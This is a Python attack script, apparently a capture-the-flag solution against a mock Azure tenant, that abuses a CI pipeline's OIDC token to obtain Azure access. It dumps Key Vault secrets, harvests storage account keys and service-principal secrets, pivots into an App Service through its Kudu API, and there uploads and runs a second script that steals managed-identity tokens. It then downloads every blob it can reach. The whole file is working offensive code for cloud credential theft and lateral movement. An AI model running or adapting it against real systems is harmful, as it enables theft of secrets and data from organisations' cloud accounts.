import os, json, base64, urllib.request, urllib.parse, urllib.error, hashlib, hmac, datetime, re, sys, time

TEN=os.environ.get("AZURE_TENANT_ID","3205c325-06a5-4171-9ce8-ffc5e6c2845e")
SUB=os.environ.get("AZURE_SUBSCRIPTION_ID","c5e4e004-b42d-4ac4-a502-5fd338380eb6")
CID=os.environ.get("AZURE_CLIENT_ID","72ff278a-9e71-43ec-bac4-2ca303f8e462")
RG="rg-tbl-platform-prod-sea"; RG2="rg-tbl-reporting-prod-eus"
ACCTS=["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz","sttblarchiveprodx3euoz"]
VAULTS=["kv-tbl-prod-x3euoz","kv-tbl-sec-x3euoz"]
SP_NAMES=["cost-reader-principal","directory-audit-principal","reporting-service-principal","reporting-viewer-principal","secrets-sync-principal","sync-service-principal"]
OUT=[]

def P(*a):
    s=" ".join(str(x) for x in a); print(s,flush=True); OUT.append(s)

def B(x):
    if isinstance(x,str): x=x.encode()
    return base64.b64encode(x).decode()

def http(url, method="GET", headers=None, data=None, form=None, timeout=40):
    h=dict(headers or {})
    if form is not None:
        data=urllib.parse.urlencode(form).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif isinstance(data,(dict,list)):
        data=json.dumps(data).encode(); h.setdefault("Content-Type","application/json")
    elif isinstance(data,str): data=data.encode()
    r=urllib.request.Request(url,data=data,method=method,headers=h)
    try:
        with urllib.request.urlopen(r,timeout=timeout) as x: return x.status,x.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        try: return e.code,e.read().decode("utf-8","replace")[:6000]
        except Exception: return e.code,""
    except Exception as e: return 0,repr(e)

def jclaims(t):
    try:
        p=t.split(".")[1]; p+="="*(-len(p)%4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception: return {}

def oidc():
    u=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL",""); tok=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
    if not u or not tok: return ""
    st,b=http(u+("&" if "?" in u else "?")+"audience=api://AzureADTokenExchange",headers={"Authorization":"bearer "+tok})
    try: return json.loads(b).get("value","")
    except Exception: return ""

def aad_form(endpoint,form):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",method="POST",form=form)
    try: return json.loads(b).get("access_token",""), st, b
    except Exception: return "", st, b

def assert_tok(scope,client=CID,jwt=None):
    jwt=jwt or OIDC
    t,st,b=aad_form("token",{"client_id":client,"grant_type":"client_credentials","scope":scope,
        "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":jwt})
    if not t: P("EXCHANGE_ERR",scope,st,B(b[:800]))
    return t

def secret_tok(cid,sec,scope):
    t,st,b=aad_form("token",{"client_id":cid,"client_secret":sec,"grant_type":"client_credentials","scope":scope})
    if not t: P("SP_TOKEN_ERR",scope,st,B(b[:800]))
    return t

def H(t): return {"Authorization":"Bearer "+t}

def arm(path,tok,method="GET",data=None):
    return http("https://management.azure.com"+path,method=method,headers=H(tok),data=data)

def vault_get(v,path,tok):
    return http(f"https://{v}.vault.azure.net{path}",headers=H(tok))

def scan_text(label,text):
    for pat in [r'DF26\{[^}\r\n]{1,300}\}',r'CBJS\{[^}\r\n]{1,300}\}',r'FLAG\{[^}\r\n]{1,300}\}',r'flag\{[^}\r\n]{1,300}\}',
                r'tebamoto\{[^}\r\n]{1,300}\}',r'PayDojo\{[^}\r\n]{1,300}\}',r'TBL\{[^}\r\n]{1,300}\}']:
        for m in re.findall(pat,text,re.I): P("FLAGHIT",label,m)

def blob_sign(acct,key,method,path,query=""):
    kb=base64.b64decode(key)
    now=datetime.datetime.now(datetime.timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")
    hdr={"x-ms-date":now,"x-ms-version":"2021-08-06"}
    ms="".join(f"{k.lower()}:{hdr[k].strip()}\n" for k in sorted(hdr) if k.lower().startswith("x-ms-"))
    res=("/%s/"%acct) if not path else "/%s%s"%(acct,path)
    qs=urllib.parse.parse_qsl(query,keep_blank_values=True)
    for k,v in sorted(qs): res+="\n%s:%s"%(k.lower(),urllib.parse.unquote(v))
    sts=method+"\n"*12+ms+res
    sig=base64.b64encode(hmac.new(kb,sts.encode(),hashlib.sha256).digest()).decode()
    hdr["Authorization"]=f"SharedKey {acct}:{sig}"
    return hdr

def blob_req(acct,key,method,path,query="",timeout=40):
    h=blob_sign(acct,key,method,path,query)
    url=f"https://{acct}.blob.core.windows.net{path}"+(("?"+query) if query else "")
    return http(url,method=method,headers=h,timeout=timeout)

def enum_blobs(acct,key,tag):
    st,b=blob_req(acct,key,"GET","","comp=list")
    P("CONT",tag,acct,st,B(b[:4000])); scan_text(tag+"_containers",b)
    if st!=200: return
    conts=re.findall(r"<Name>([^<]+)</Name>",b)
    for c in conts:
        st2,b2=blob_req(acct,key,"GET","/"+c,"restype=container&comp=list")
        P("BLOBS",tag,acct,c,st2,B(b2[:10000])); scan_text(tag+"_"+c+"_list",b2)
        if st2!=200: continue
        for n in re.findall(r"<Name>([^<]+)</Name>",b2):
            st3,b3=blob_req(acct,key,"GET",f"/{c}/{n}")
            txt=b3
            P("BLOB",tag,acct,c,n,"STATUS",st3,"LEN",len(b3),"B64",B(b3[:100000]))
            scan_text(f"{tag}/{acct}/{c}/{n}",txt)
            if len(b3)>100000: P("BLOB_TRUNCATED",tag,acct,c,n,len(b3))

OIDC=oidc()
P("OIDC_LEN",len(OIDC))
if OIDC: P("OIDC_CLAIMS",json.dumps(jclaims(OIDC)))

TOK={}
for name,scope in [("vault","https://vault.azure.net/.default"),("arm","https://management.azure.com/.default"),
                   ("storage","https://storage.azure.com/.default"),("graph","https://graph.microsoft.com/.default")]:
    t=assert_tok(scope); TOK[name]=t
    P("CI_"+name.upper(),"LEN",len(t),"CLAIMS",json.dumps(jclaims(t))[:1500])

# CI vault access
for v in VAULTS:
    st,b=vault_get(v,"/secrets?api-version=7.4",TOK.get("vault",""))
    P("CI_VAULT_LIST",v,st,B(b[:4000])); scan_text("CI_"+v,b)
    try:
        for item in json.loads(b).get("value",[]):
            n=item["id"].rsplit("/",1)[1]
            st2,b2=vault_get(v,f"/secrets/{n}?api-version=7.4",TOK.get("vault",""))
            P("CI_SECRET",v,n,st2,B(b2[:3000])); scan_text("CI_"+v+"/"+n,b2)
    except Exception as e: P("CI_VAULT_PARSE",v,str(e))

# CI ARM listKeys + role assignments on storage
for sa in ACCTS:
    p=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-05-01"
    st,b=arm(p,TOK.get("arm",""),"POST",b"{}"); P("CI_LISTKEYS",sa,st,B(b[:3000]))
    p=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
    st,b=arm(p,TOK.get("arm","")); P("CI_RA_STORAGE",sa,st,B(b[:6000]))

# Load SP creds from KV prod via CI vault token
SPS={}
for sn in SP_NAMES:
    st,b=vault_get("kv-tbl-prod-x3euoz",f"/secrets/{sn}?api-version=7.4",TOK.get("vault",""))
    try:
        j=json.loads(json.loads(b).get("value",""))
        SPS[sn.replace("-principal","")]=[j.get("appId",""),j.get("clientSecret","")]
    except Exception as e: P("SP_LOAD_ERR",sn,st,str(e))
P("LOADED_SP",json.dumps(sorted(SPS.keys())))

KEYS={}
for name,(cid,sec) in SPS.items():
    at=secret_tok(cid,sec,"https://management.azure.com/.default")
    vt=secret_tok(cid,sec,"https://vault.azure.net/.default")
    P("SP",name,"ARM",len(at),"VAULT",len(vt),"CLAIMS",json.dumps(jclaims(at))[:600])
    for sa in ACCTS:
        p=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-05-01"
        st,b=arm(p,at,"POST",b"{}")
        P("SP_LISTKEYS",name,sa,st)
        if st==200:
            try:
                for k in json.loads(b).get("keys",[]): KEYS.setdefault(sa,set()).add(k.get("value",""))
            except Exception: pass
    for v in VAULTS:
        st,b=vault_get(v,"/secrets?api-version=7.4",vt)
        P("SP_VAULT_LIST",name,v,st,B(b[:2500]))
        try:
            for item in json.loads(b).get("value",[]):
                n=item["id"].rsplit("/",1)[1]
                st2,b2=vault_get(v,f"/secrets/{n}?api-version=7.4",vt)
                P("SP_SECRET",name,v,n,st2,B(b2[:2500])); scan_text(name+"/"+v+"/"+n,b2)
        except Exception: pass
    if name=="sync-service":
        pass

# Kudu pivot: reporting-svc -> publishing creds -> run UAMI probe inside app
KUDU_OUT=""
try:
    rs=SPS.get("reporting-svc")
    at=secret_tok(rs[0],rs[1],"https://management.azure.com/.default")
    p=f"/subscriptions/{SUB}/resourceGroups/{RG2}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2023-01-01"
    st,b=arm(p,at,"POST",b"{}")
    P("PUBCREDS_STATUS",st)
    j=json.loads(b).get("properties",{})
    user=j.get("publishingUserName",""); pw=j.get("publishingPassword","")
    P("PUBCREDS_USER",user,"PWLEN",len(pw))
    auth="Basic "+base64.b64encode(f"{user}:{pw}".encode()).decode()
    HOST="app-tbl-reporting-prod.scm.azurewebsites.net"
    up="""import os,json,base64,urllib.request,urllib.parse,urllib.error,re
IE=os.environ.get('IDENTITY_ENDPOINT','');IH=os.environ.get('IDENTITY_HEADER','')
CID='7a85156a-01c4-4e61-8472-40a92107159b'
ACCTS=['sttblappcfgprodx3euoz','sttblbackupprodx3euoz','sttblcilogsprodx3euoz','sttblarchiveprodx3euoz']
VAULTS=['kv-tbl-prod-x3euoz','kv-tbl-sec-x3euoz']
SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6';RG='rg-tbl-platform-prod-sea'
def P(*a): print(' '.join(str(x) for x in a),flush=True)
def http(url,method='GET',headers=None,data=None,timeout=25):
    r=urllib.request.Request(url,data=data,method=method,headers=headers or {})
    try:
        with urllib.request.urlopen(r,timeout=timeout) as x:return x.status,x.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        try:return e.code,e.read().decode('utf-8','replace')[:3000]
        except Exception:return e.code,''
    except Exception as e:return 0,repr(e)
def tok(res):
    u=IE+'?'+urllib.parse.urlencode({'api-version':'2019-08-01','resource':res,'client_id':CID})
    st,b=http(u,headers={'X-IDENTITY-HEADER':IH})
    try:return json.loads(b).get('access_token','')
    except Exception:return ''
P('IE_SET',bool(IE),'IH_LEN',len(IH))
for scope in ['https://vault.azure.net','https://management.azure.com','https://storage.azure.com']:
    t=tok(scope);P('UAMI_TOK',scope,len(t))
    if not t: continue
    if 'vault' in scope:
        for v in VAULTS:
            st,b=http('https://%s.vault.azure.net/secrets?api-version=7.4'%v,headers={'Authorization':'Bearer '+t})
            P('UAMI_VAULT_LIST',v,st,base64.b64encode(b.encode()).decode())
            try:
                for it in json.loads(b).get('value',[]):
                    n=it['id'].rsplit('/',1)[1]
                    st2,b2=http('https://%s.vault.azure.net/secrets/%s?api-version=7.4'%(v,n),headers={'Authorization':'Bearer '+t})
                    P('UAMI_SECRET',v,n,st2,base64.b64encode(b2.encode()).decode())
            except Exception: pass
    if 'management' in scope:
        for sa in ACCTS:
            st,b=http('https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s/listKeys?api-version=2023-05-01'%(SUB,RG,sa),
                      method='POST',headers={'Authorization':'Bearer '+t,'Content-Length':'0'})
            P('UAMI_LISTKEYS',sa,st,base64.b64encode(b.encode()).decode())
        st,b=http('https://management.azure.com/subscriptions/%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01'%SUB,
                  headers={'Authorization':'Bearer '+t})
        P('UAMI_RA',st,base64.b64encode(b.encode()).decode()[:20000])
    if 'storage' in scope:
        for sa in ACCTS:
            st,b=http('https://%s.blob.core.windows.net/?comp=list'%sa,headers={'Authorization':'Bearer '+t,'x-ms-version':'2021-08-06'})
            P('UAMI_CONT',sa,st,base64.b64encode(b.encode()).decode()[:4000])
P('UAMI_DONE')
"""
    # upload script via VFS PUT
    upath="site/wwwroot/uami_probe.py"
    st,b=http(f"https://{HOST}/api/vfs/{upath}",method="PUT",headers={"Authorization":auth,"Content-Type":"application/octet-stream","If-Match":"*"},data=up.encode())
    P("KUDU_PUT",st,B(b[:300]))
    # run via command API
    st,b=http(f"https://{HOST}/api/command",method="POST",headers={"Authorization":auth,"Content-Type":"application/json"},
              data=json.dumps({"command":"python3 /home/site/wwwroot/uami_probe.py","dir":"site/wwwroot"}).encode(),timeout=120)
    P("KUDU_CMD_STATUS",st)
    KUDU_OUT=b
    P("KUDU_OUTPUT_B64",B(b[:120000]))
    scan_text("KUDU_OUTPUT",b)
    # parse UAMI listkeys from kudu output
    try:
        out=json.loads(b).get("Output","")
        for sa in ACCTS:
            m=re.search(r"UAMI_LISTKEYS %s (\d+) ([A-Za-z0-9+/=]+)"%sa,out)
            if m and m.group(1)=="200":
                kb=base64.b64decode(m.group(2)).decode("utf-8","replace")
                try:
                    for k in json.loads(kb).get("keys",[]): KEYS.setdefault(sa,set()).add(k.get("value",""))
                except Exception: pass
    except Exception as e: P("KUDU_PARSE_ERR",str(e))
except Exception as e:
    P("KUDU_PIVOT_ERR",repr(e))

# enumerate blobs with all collected keys
for sa in sorted(KEYS):
    P("HAVE_KEYS",sa,len(KEYS[sa]))
    for key in list(KEYS[sa])[:2]:
        enum_blobs(sa,key,"K")

P("DONE")
